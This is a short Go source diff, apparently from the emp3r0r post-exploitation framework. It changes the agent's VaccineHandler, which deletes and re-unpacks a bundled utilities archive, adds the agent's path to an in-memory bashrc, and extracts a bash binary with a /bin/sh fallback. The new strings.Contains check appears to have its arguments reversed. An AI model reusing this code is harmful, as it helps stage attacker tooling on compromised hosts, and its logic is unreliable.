@@ -10,6 +10,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -27,12 +28,14 @@ func VaccineHandler() (out string) {
 	}
 
 	// unpack utils.tar.bz2 to our PATH
+	os.RemoveAll(emp3r0r_data.UtilsPath) // archiver fucking aborts when files already exist
 	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
 		if err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700); err != nil {
 			log.Print(err)
 			return fmt.Sprintf("mkdir: %v", err)
 		}
 	}
+
 	if err = archiver.Unarchive(emp3r0r_data.AgentRoot+"/utils.tar.bz2", emp3r0r_data.UtilsPath); err != nil {
 		log.Printf("Unarchive: %v", err)
 		return fmt.Sprintf("Unarchive: %v", err)
@@ -41,11 +44,15 @@ func VaccineHandler() (out string) {
 
 	// update PATH in .bashrc
 	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", emp3r0r_data.UtilsPath)
-	if !util.IsStrInFile(exportPATH, emp3r0r_data.UtilsPath+"/.bashrc") {
-		err = util.AppendToFile(emp3r0r_data.UtilsPath+"/.bashrc", exportPATH)
+	if !strings.Contains(exportPATH, emp3r0r_data.BashRC) {
+		emp3r0r_data.BashRC += "\n" + exportPATH
+		// extract bash please
+		err = ExtractBash()
 		if err != nil {
-			log.Printf("Update bashrc: %v", err)
-			out = fmt.Sprintf("Update bashrc: %v", err)
+			log.Printf("[-] Cannot extract bash: %v", err)
+		}
+		if !util.IsFileExist(emp3r0r_data.DefaultShell) {
+			emp3r0r_data.DefaultShell = "/bin/sh"
 		}
 	}
 	return
